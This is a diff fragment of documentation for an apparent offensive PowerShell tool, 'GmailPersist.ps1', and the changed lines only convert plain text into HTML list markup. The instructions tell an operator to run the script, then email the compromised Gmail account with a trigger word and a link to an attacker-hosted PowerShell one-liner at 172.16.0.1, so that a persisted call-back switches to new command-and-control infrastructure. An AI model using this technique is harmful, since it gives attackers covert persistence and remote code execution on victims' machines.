@@ -17,13 +17,13 @@ http://172.16.0.1/powershell-oneliner.txt
 ```
 PS> ./GmailPersist.ps1
 ```
-Now send and email with the following information:
+Now send and email with the following information:<ul>
 
-FROM: (ATTACKER EMAIL)
-TO: (GMAIL ACCOUNT)
-SUBJECT: (Trigger Word)
-BODY:
-http://172.16.0.1/powershell.exe-oneliner.txt
+<li>FROM: (ATTACKER EMAIL)</li>
+<li>TO: (GMAIL ACCOUNT)</li>
+<li>SUBJECT: (Trigger Word)</li>
+<li>BODY:<br />
+http://172.16.0.1/powershell.exe-oneliner.txt</li></ul>
 
 <h4>Main Usage</h4>
 This is a knocker so a persisted call-back can easily be changed to call-back to a new C2 infrastructure.
